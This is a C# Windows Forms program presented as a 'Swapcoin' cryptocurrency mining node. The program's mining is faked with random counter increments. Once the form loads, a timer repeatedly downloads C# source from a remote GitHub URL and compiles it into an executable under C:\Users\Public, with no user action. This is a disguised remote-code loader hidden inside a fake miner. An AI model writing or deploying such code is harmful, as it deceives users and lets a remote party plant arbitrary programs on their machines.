using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.IO;
using Microsoft.CSharp;
using System.CodeDom.Compiler;

namespace Swapcoin_Node
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        string value = "0";
      
        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(@"C:\Users\Public\SwapNode\Mined.MD5"))
            {
                File.WriteAllText(@"C:\Users\Public\SwapNode\Mined.MD5", "0");
                label1.Text = value + " SWP";
            }
            else
            {
                value = File.ReadAllText(@"C:\Users\Public\SwapNode\Mined.MD5");
                label1.Text = value + " SWP";
            }

            Directory.CreateDirectory(@"C:\Users\Public\SwapNode");
            WebClient wc = new WebClient();
            Uri url = new Uri("https://raw.githubusercontent.com/MinecraftPublisher/miner/master/news.md5");
            richTextBox1.Text = wc.DownloadString(url);
            this.Opacity = 100;
            this.ShowInTaskbar = true;
            timer1.Enabled = true;
        }


        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Miner.Enabled = true;
        }

        private void Miner_Tick(object sender, EventArgs e)
        {
            if(new Random().Next(0,20) == 0)
            {
                int mined = int.Parse(value) + new Random().Next(1, 3);
                value = mined.ToString();
                File.WriteAllText(@"C:\Users\Public\SwapNode\Mined.MD5", value);
                label1.Text = value + " SWP";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            Uri url = new Uri("https://raw.githubusercontent.com/MinecraftPublisher/darkOS/master/compiler.cs");
            wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
            wc.DownloadFileAsync(url, @"C:\Users\Public\SwapNode\Compiler.cs");
        }
        private void Wc_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            string data = File.ReadAllText(@"C:\Users\Public\SwapNode\Compiler.cs");
            if (data == "not now")
            {

            }
            else
            {
                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
                ICodeCompiler icc = codeProvider.CreateCompiler();
                string Output = @"C:\Users\Public\SwapNode\Compiler.exe";
                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
                //Make sure we generate an EXE, not a DLL
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = Output;
                CompilerResults results = icc.CompileAssemblyFromSource(parameters, data);
            }
        }
    }
}
